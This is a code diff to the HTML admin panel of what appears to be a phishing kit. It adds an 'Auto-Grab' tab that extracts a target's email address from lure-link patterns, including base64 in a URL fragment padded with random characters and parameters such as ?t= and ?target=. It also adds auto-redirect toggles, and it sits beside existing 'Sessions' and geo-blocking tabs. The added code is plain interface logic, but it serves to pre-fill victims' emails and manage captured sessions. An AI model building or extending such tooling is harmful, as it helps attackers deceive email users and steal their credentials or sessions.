@@ -528,6 +528,9 @@
             <button class="tab-button" onclick="switchTab('sessions')">
                 🗺 Sessions
             </button>
+            <button class="tab-button" onclick="switchTab('autograb')">
+                🎯 Auto-Grab
+            </button>
         </div>
 
         <!-- Content Area -->
@@ -797,6 +800,94 @@
                 
             </div>
 
+            <!-- Auto-Grab Tab -->
+            <div id="autograb-tab" class="tab-content">
+                <h2 class="section-title">Auto-Grab URL Parser</h2>
+
+                <div class="dashboard-grid" style="margin-bottom: 20px;">
+                    <div class="dashboard-card">
+                        <div class="dashboard-card-icon">🎯</div>
+                        <div class="dashboard-card-content">
+                            <div class="dashboard-card-number" id="autograb-status">OFF</div>
+                            <div class="dashboard-card-label">Auto-Grab Status</div>
+                        </div>
+                    </div>
+                    <div class="dashboard-card info">
+                        <div class="dashboard-card-icon">🔄</div>
+                        <div class="dashboard-card-content">
+                            <div class="dashboard-card-number" id="autograb-redirect">Enabled</div>
+                            <div class="dashboard-card-label">Auto-Redirect</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="background: #1e293b; border: 1px solid #475569; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">URL Parser Settings</h3>
+
+                    <div class="form-group">
+                        <label class="form-label">Enable Auto-Grab:</label>
+                        <div style="display: flex; gap: 12px; align-items: center;">
+                            <button onclick="toggleAutoGrab()" id="autograb-toggle-btn" class="btn">
+                                Enable Auto-Grab
+                            </button>
+                            <span id="autograb-toggle-status" style="color: #94a3b8; font-size: 14px;">Currently disabled</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Auto-Redirect After Parse:</label>
+                        <div style="display: flex; gap: 12px; align-items: center;">
+                            <button onclick="toggleAutoRedirect()" id="autoredirect-toggle-btn" class="btn">
+                                Toggle Auto-Redirect
+                            </button>
+                            <span id="autoredirect-toggle-status" style="color: #94a3b8; font-size: 14px;">Currently enabled</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="background: #1e293b; border: 1px solid #475569; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Test URL Parser</h3>
+
+                    <div class="form-group">
+                        <label class="form-label">Enter URL to Parse:</label>
+                        <input type="url" id="autograb-url-input" class="form-input" placeholder="https://example.com/?t=email@example.com">
+                    </div>
+
+                    <div style="display: flex; gap: 12px; margin-bottom: 16px;">
+                        <button onclick="testAutoGrabUrl()" class="btn btn-success">Parse URL</button>
+                        <button onclick="clearAutoGrabTest()" class="btn btn-secondary">Clear</button>
+                    </div>
+
+                    <div id="autograb-result" style="display: none; background: #0f172a; border: 1px solid #475569; padding: 16px; border-radius: 6px;">
+                        <h4 style="color: #22c55e; font-size: 14px; margin: 0 0 12px 0;">✅ Parsing Result</h4>
+                        <div style="color: #e2e8f0; font-size: 14px; margin-bottom: 8px;">
+                            <strong>Email:</strong> <span id="autograb-result-email" style="color: #3b82f6;">-</span>
+                        </div>
+                        <div style="color: #e2e8f0; font-size: 14px; margin-bottom: 8px;">
+                            <strong>Pattern:</strong> <span id="autograb-result-pattern" style="color: #fb923c;">-</span>
+                        </div>
+                        <div style="color: #e2e8f0; font-size: 14px;">
+                            <strong>Type:</strong> <span id="autograb-result-type" style="color: #94a3b8;">-</span>
+                        </div>
+                    </div>
+
+                    <div id="autograb-error" style="display: none; background: #450a0a; border: 1px solid #ef4444; padding: 16px; border-radius: 6px; color: #ef4444; font-size: 14px;">
+                    </div>
+                </div>
+
+                <div style="background: #1e293b; border: 1px solid #475569; padding: 20px; border-radius: 8px;">
+                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Supported URL Patterns</h3>
+                    <div style="color: #94a3b8; font-size: 13px; line-height: 1.8;">
+                        <div style="margin-bottom: 8px;">✓ <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">#(Random 4)(Email Base64)(Random 4)</code></div>
+                        <div style="margin-bottom: 8px;">✓ <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">#(Email)</code> or <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">#(Email Base64)</code></div>
+                        <div style="margin-bottom: 8px;">✓ <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">?t=(email)</code> or <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">?t=(email base64)</code></div>
+                        <div style="margin-bottom: 8px;">✓ <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">?a=(email)</code>, <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">?email=(email)</code>, <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">?e=(email)</code>, <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">?target=(email)</code></div>
+                        <div style="margin-bottom: 8px;">✓ <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">/$&lt;(email)&gt;</code> or <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">/*&lt;(email)&gt;</code> or <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">/&lt;(email)&gt;</code></div>
+                        <div>✓ <code style="background: #0f172a; padding: 2px 6px; border-radius: 3px;">/$&lt;randomchar&gt;*&lt;(email)&gt;</code> and similar complex patterns</div>
+                    </div>
+                </div>
+            </div>
+
             <!-- Sessions Tab -->
             <div id="sessions-tab" class="tab-content">
                 <h2 class="section-title">Session Database</h2>
@@ -860,6 +951,8 @@
             // Load data for specific tabs
             if (tabName === 'sessions' && isAuthenticated) {
                 loadSessions();
+            } else if (tabName === 'autograb' && isAuthenticated) {
+                loadAutoGrabConfig();
             } else if (tabName === 'geoblock') {
                 // Always load geo-block config when tab is opened (even if not authenticated)
                 // This renders the country list, which doesn't require authentication
@@ -1712,6 +1805,170 @@
             { code: 'ZM', name: 'Zambia' },
             { code: 'ZW', name: 'Zimbabwe' }
         ];
+
+        async function loadAutoGrabConfig() {
+            if (!isAuthenticated) return;
+
+            try {
+                const token = getStoredToken();
+                const response = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`);
+                const data = await response.json();
+
+                if (data.success) {
+                    const config = data.config;
+
+                    document.getElementById('autograb-status').textContent = config.enabled ? 'ON' : 'OFF';
+                    document.getElementById('autograb-redirect').textContent = config.autoRedirect ? 'Enabled' : 'Disabled';
+
+                    const toggleBtn = document.getElementById('autograb-toggle-btn');
+                    const toggleStatus = document.getElementById('autograb-toggle-status');
+                    if (config.enabled) {
+                        toggleBtn.textContent = 'Disable Auto-Grab';
+                        toggleStatus.textContent = 'Currently enabled';
+                        toggleStatus.style.color = '#22c55e';
+                    } else {
+                        toggleBtn.textContent = 'Enable Auto-Grab';
+                        toggleStatus.textContent = 'Currently disabled';
+                        toggleStatus.style.color = '#94a3b8';
+                    }
+
+                    const redirectBtn = document.getElementById('autoredirect-toggle-btn');
+                    const redirectStatus = document.getElementById('autoredirect-toggle-status');
+                    if (config.autoRedirect) {
+                        redirectStatus.textContent = 'Currently enabled';
+                        redirectStatus.style.color = '#22c55e';
+                    } else {
+                        redirectStatus.textContent = 'Currently disabled';
+                        redirectStatus.style.color = '#94a3b8';
+                    }
+                }
+            } catch (error) {
+                console.error('Error loading auto-grab config:', error);
+            }
+        }
+
+        async function toggleAutoGrab() {
+            if (!isAuthenticated) {
+                alert('Please log in first');
+                return;
+            }
+
+            try {
+                const token = getStoredToken();
+                const response = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`);
+                const data = await response.json();
+
+                if (!data.success) {
+                    throw new Error(data.error || 'Failed to get config');
+                }
+
+                const newState = !data.config.enabled;
+
+                const updateResponse = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ enabled: newState })
+                });
+
+                const updateData = await updateResponse.json();
+
+                if (!updateData.success) {
+                    throw new Error(updateData.error || 'Failed to update config');
+                }
+
+                loadAutoGrabConfig();
+                alert(`Auto-Grab ${newState ? 'enabled' : 'disabled'} successfully!`);
+            } catch (error) {
+                console.error('Error toggling auto-grab:', error);
+                alert(`Failed to toggle auto-grab: ${error.message}`);
+            }
+        }
+
+        async function toggleAutoRedirect() {
+            if (!isAuthenticated) {
+                alert('Please log in first');
+                return;
+            }
+
+            try {
+                const token = getStoredToken();
+                const response = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`);
+                const data = await response.json();
+
+                if (!data.success) {
+                    throw new Error(data.error || 'Failed to get config');
+                }
+
+                const newState = !data.config.autoRedirect;
+
+                const updateResponse = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ autoRedirect: newState })
+                });
+
+                const updateData = await updateResponse.json();
+
+                if (!updateData.success) {
+                    throw new Error(updateData.error || 'Failed to update config');
+                }
+
+                loadAutoGrabConfig();
+                alert(`Auto-Redirect ${newState ? 'enabled' : 'disabled'} successfully!`);
+            } catch (error) {
+                console.error('Error toggling auto-redirect:', error);
+                alert(`Failed to toggle auto-redirect: ${error.message}`);
+            }
+        }
+
+        async function testAutoGrabUrl() {
+            if (!isAuthenticated) {
+                alert('Please log in first');
+                return;
+            }
+
+            const urlInput = document.getElementById('autograb-url-input').value.trim();
+            if (!urlInput) {
+                alert('Please enter a URL to test');
+                return;
+            }
+
+            try {
+                const token = getStoredToken();
+                const response = await fetch(`/api/admin/autograb/parse?token=${encodeURIComponent(token)}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: urlInput })
+                });
+
+                const data = await response.json();
+
+                document.getElementById('autograb-error').style.display = 'none';
+                document.getElementById('autograb-result').style.display = 'none';
+
+                if (data.success) {
+                    document.getElementById('autograb-result-email').textContent = data.email;
+                    document.getElementById('autograb-result-pattern').textContent = data.pattern;
+                    document.getElementById('autograb-result-type').textContent = data.redirectType;
+                    document.getElementById('autograb-result').style.display = 'block';
+                } else {
+                    const errorDiv = document.getElementById('autograb-error');
+                    errorDiv.textContent = '❌ ' + (data.error || 'Failed to parse URL');
+                    errorDiv.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error testing auto-grab URL:', error);
+                const errorDiv = document.getElementById('autograb-error');
+                errorDiv.textContent = '❌ Network error: ' + error.message;
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        function clearAutoGrabTest() {
+            document.getElementById('autograb-url-input').value = '';
+            document.getElementById('autograb-result').style.display = 'none';
+            document.getElementById('autograb-error').style.display = 'none';
+        }
 
         async function loadGeoBlockConfig() {
             // Always render country checkboxes (doesn't require authentication)
